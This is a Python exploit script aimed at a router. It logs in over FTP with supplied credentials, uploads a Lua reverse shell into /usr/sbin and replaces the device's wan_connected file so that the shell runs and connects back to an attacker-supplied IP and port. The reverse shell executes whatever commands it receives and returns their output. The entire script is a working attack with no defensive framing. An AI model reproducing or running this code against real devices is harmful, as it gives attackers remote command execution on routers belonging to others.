from ftplib import FTP
import sys
import io

# usage <script> <target> <ftp user> <ftp pass> <attacker ip> <attacker pass>
# This script will log in over FTP to the router
# Then change to the /usr/sbin directory, after following the rootfs symlink
# Next a Lua reverse shell is uploaded
# And finally a file named wan_connected is uploaded, which will execute the shell

if len(sys.argv) < 6:
    print("Usage: <router ip> <user> <password> <attacker ip> <attacker port>")
    sys.exit(1)

target_ip = sys.argv[1]
user = sys.argv[2]
password = sys.argv[3]

attacker_ip = sys.argv[4]
attacker_port = sys.argv[5]

# connect to FTP
print("Connecting to FTP")
ftp = FTP(host=target_ip, user=user, passwd=password)

print("Changing to /usr/sbin")
ftp.cwd('rootfs/usr/sbin')

# create shell.lua
shell_lua = """
-- shell credit https://gist.github.com/cldrn/372b31c90d7f88be9020020b8e534dc4
-- usage: shell.lua <ip> <port>
local host, port = arg[1], tonumber(arg[2])     -- ip, port
local socket = require("socket")
local tcp = socket.tcp()
local io = require("io")
tcp:connect(host, port);
while true do
        local cmd, status, partial = tcp:receive()
        local f = io.popen(cmd, 'r')
        local s = f:read("*a")
        f:close()
        tcp:send(s)
        if status == "closed" then
                break
        end
end tcp:close()
"""

print("Uploading shell.lua")
shell = io.BytesIO(shell_lua.encode('utf-8'))
ftp.storbinary('STOR shell.lua', shell)
shell.close()

# replace wan_connected to call shell
print("Uploading wan_connected")
call_shell = f"lua /usr/sbin/shell.lua {attacker_ip} {attacker_port}"
wan_connected = io.BytesIO(call_shell.encode('utf-8'))
ftp.storbinary('STOR wan_connected', wan_connected) # store it
wan_connected.close()

ftp.quit()

print("Done")
